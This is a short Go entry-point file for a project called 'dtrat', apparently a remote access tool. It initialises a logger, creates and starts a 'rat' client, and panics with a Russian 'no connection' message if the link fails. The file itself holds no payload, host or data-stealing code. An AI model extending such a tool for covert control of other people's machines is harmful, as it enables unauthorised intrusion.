package main

import (
	"dtrat/global"
	"dtrat/rat"
	"io"

	"github.com/deuterium34/dlog"
)

func main() {
	dlog.GLogger = dlog.NewDefaultLogger()

	r, err := rat.NewRat()
	if err == io.EOF {
		panic("Отсутсвует соединение")
	}

	if err != nil {
		panic(err)
	}

	global.Init()
	global.Add("rat_close_func", r.Close)

	r.Start()

	closeReason := <-r.CloseCh
	if closeReason == rat.ErrClosed {
		return
	}

	panic(closeReason)
}
